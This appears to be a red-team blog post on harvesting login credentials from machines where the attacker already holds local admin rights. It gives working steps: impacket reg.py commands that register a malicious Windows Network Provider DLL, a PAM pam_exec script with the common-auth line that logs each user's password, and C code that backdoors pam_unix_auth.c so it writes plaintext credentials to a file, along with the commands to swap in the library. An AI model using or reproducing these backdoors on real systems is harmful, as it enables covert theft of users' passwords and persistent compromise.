---
layout: post2
language: en
title:  "Harvesting Credentials"
categories:  en Credentials
tags: [ "Red Team", "Credentials", "Escalation"]
---

## Index
---
1. [Network Providers (Windows)](#network-providers-windows)
2. [PAM poisoning (Linux)](#pam-poisoning-linux)
	1. [Adding script to common-auth](#adding-script-to-common-auth)
	2. [Replacing the modified library](#replacing-the-modified-library)

---

# Introduction

Sometimes we can have an local administrator account pawned, but the account hasn't active directory permissions, or we need credentials from a specific account, which we know it's login in a specific machine. With the local  administrator account we can get the credentials for all user who make login in the machine with a technique which poisoned the login process, this could do on both Windows and linux, obviously are different kind of process.

In Windows we use the Networks Providers however in linux, we poisoned the PAM process to the credentials.

<b><i>On both it will be necessary the local administrator  permissions, because we need change the  authentication process</i></b>
<br>

---

## Netwok Providers (Windows)

In the Windows authentication process is doing through *Windlogon*, which give a GUI to the authentication process.

*Network Provider* is a DLL used to do a network communication, interact with Windows Api, the modifications could be user to get user credential, who make login in the machine.

For this you have to modify the DLL, [this](https://github.com/alhkytran/networkprovider.c) could be an example about this modification, is it based in the [NPPspy](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy)

In our example we have an user account with low privilege, is called `mokete`, this account is local admin in the *Windows10* machine, then we can do registry modifications.

<p align="center">
   <img src="/assets/img/mokete1.png">
</p>

<p align="center">
   <img src="/assets/img/mokete2.png">
</p>

<p align="center">
   <img src="/assets/img/mokete_smb.png">
</p>

First of all we have to upload the file, in our case we upload it in a controlled folder, it could be a system folder with a "nice" name to be herder to find it, in our case don't care about it, we upload to *C:\\Users\\Public\\Downloads\\* with the name *NetworkProvider.dll*

<p align="center">
   <img src="/assets/img/NP-uploadfile.png">
</p>

After this, we use  `reg.py`, from impacket, to modify the registry machine and  when a user make login use our modified dll.

## <b style="color:red">Important</b>
`reg.py`  has a fail to write in the regist, although it does not give failure it does not write correctly, to solve the failure it is necessary to modify the file `rrp.py` as appear [here](https://github.com/fortra/impacket/pull/1295/commits/ef90107a3f733c428450ceb7f30f60ef1c9d54c6) after the modify as said in the link, we must reinstall impacket, for that i recommend use  `virutalenv` and use `python3 setup.py install` to reimpacket.

<p align="center">
   <img src="/assets/img/NP-cambio-rrp.png">
</p>

<p align="center">
   <img src="/assets/img/NP-impa.png">
</p>


After solve impacket the first that we have to do is list the Providers, we do this to not remove a providers in use.

```impacket
reg.py mokete@Windows10.brain.body query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order'
```

<p align="center">
   <img src="/assets/img/NP-providers1.png">
</p>

Then ad *Veneno* in the providers, this will be which intercept the credentials.
```impacket
reg.py mokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order' -v ProviderOrder -vt REG_SZ -vd "VBoxSF,RDPNP,LanmanWorkstation,WebClient,Veneno"
```

<p align="center">
   <img src="/assets/img/NP-providers2.png">
</p>

After we create the "path" in the *ControlSet* until indicate the dll which have charge
```impacket
reg.py mokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno'
```

<p align="center">
   <img src="/assets/img/NP-providers3.png">
</p>

```impacket
reg.py smokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider'
```
<p align="center">
   <img src="/assets/img/NP-providers4.png">
</p>

```impacket
reg.py mokete@Windows10.brain.body add  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider' -v Class -vt REG_DWORD -vd 2
```

<p align="center">
   <img src="/assets/img/NP-providers5.png">
</p>

```impacket
reg.py mokete@Windows10.brain.body add  -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider' -v Name -vt REG_SZ -vd Veneno
```

<p align="center">
   <img src="/assets/img/NP-providers6.png">
</p>
At the end we add the dll path in the cretated registers, we use the lasts commands,  with this our dll is going to be user in the authenticated process.
```impacket
reg.py mokete@Windows10.brain.body add -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Veneno\NetworkProvider' -v ProviderPath -vt REG_EXPAND_SZ -vd "C:\users\public\Downloads\NetworkProvider.dll"
```

<p align="center">
   <img src="/assets/img/NP-providers7.png">
</p>

To check if all is right, we only have to make login in the machine and  go to the path where is indicated in the dll code.

<p align="center">
   <img src="/assets/img/NP-providers_result1.png">
</p>


---
## PAM Poisoning (Linux)
### Adding script to common-auth
One way to get credentials is following this [post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)

In this case we only have to create a script its stored the variable content in `$PAM_USER` and `$(cat -)`, this stored the passowrds

*Pluggable Authentication Modules* more knowlled as PAM, in linux, is used to manage the user authentication.
```#!/bin/bassh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/archivopassword.log
```

<p align="center">
   <img src="/assets/img/NP-script.png">
</p>

WIth `chmod +x` we give the execution permission to the filel. After this we change the file  `/etc/pam.d/common-auth`, adding this lines.
<br>
`auth optional pam_exec.so quiet expose_authtok RUTA_DEL_SCRIPT`

When we have this added when an user make login correctly, appear the credentials in the log where we indicated.
<p align="center">
   <img src="/assets/img/NP-PAM1.png">
</p>


### Replacing the modified library
Other way to get the credentials is more similar to Network Providers, we need to modify the  libreries used in the authentication process and poisoning this process.

The first thing that we have to do is check the PAM version in the Linux sistem, because we have to modify and compile the correct version libreries  for don't break the process, i f we do with an incorrect PAM version could break the authentication process in the server.

For know the PAM version in the SO, we can use this command in debian OS.
<br>
`dpkg -s libpam0g`

<p align="center">
   <img src="/assets/img/NP-VersionPAM.png">
</p>

In Centos or Redhat command cyou can use:
<br>
`rpm -q pam`

WIth teh PAM version, we can get [here](https://github.com/linux-pam/linux-pam/releases) and download it.
<p align="center">
   <img src="/assets/img/NP-VersionPAM2.png">
</p>

After this, whe can modify the file `modules/pam_unix/pam_unix_auth.c` in my case i'm going to create a file in the Desktop with the credential in clear text, for this i'm going to create a function and add to the login process.
<br>

 ```c
         D(("user=%s, password=[%s]", name, p));
        retval = _unix_verify_password(pamh, name, p, ctrl);
        //llamada a la funcion creada
        savethings("/home/RUTA/Escritorio/pass.txt",name, p);
        name = p = NULL;


        AUTH_RETURN;
}


/*
Esta funcion guardará las credenciales en un archivo el archivo
 */

void savethings (const char* filename, const char* nombre, const char* passworr) {
    // Abre el archivo para escritura
    FILE *file = fopen(filename, "a");

    // Verifica si el archivo se abrió correctamente
    if (file == NULL) {
        perror("Error al abrir el archivo");
        return;
    }

    // Escribe el valor de la variable en el archivo
    fprintf(file, "Usuario: %s\nPassowrd:%s\n", nombre,passworr);

    // Cierra el archivo
    fclose(file);
}
```

<p align="center">
   <img src="/assets/img/NP-Code.png">
</p>
With this we have to do a configure and a make to generate modified the libreries, we have to substitute the `pam_unix.so` in the original path, is recommended do a bakcup for the original file before remplace it.
<br>
`cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bk`

<br>
Then we remplace the library `/lib/x86_64-linux-gnu/security/pam_unix.so` 
<br>
`cp modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so`


<br>
From here, when a user do login in this machine, create a new registry in the file with the username and password.

<p align="center">
   <img src="/assets/img/NP-miliki.png">
</p>


---

<br>
## References
- Netwok Providers
	- https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
	- https://www.hackplayers.com/2022/08/passwords-en-claro-mediante-nplogonnotify.html 
	- https://github.com/MicrosoftDocs/win32/blob/docs/desktop-src/SecAuthN/implementing-a-network-provider.md
	- https://learn.microsoft.com/en-us/windows/win32/secauthn/network-providers

- PAM
	- https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/
	- https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9
	- https://x-c3ll.github.io/posts/PAM-backdoor-DNS/ 


## Thanks
- [Mario Bartolome](https://github.com/MarioBartolome) - *For tireless help and inspiration* 
- [Jorge Lajara](https://jlajara.gitlab.io/) and Guillermo  - *The get me out from the hole that was impachet's rpp.py problem*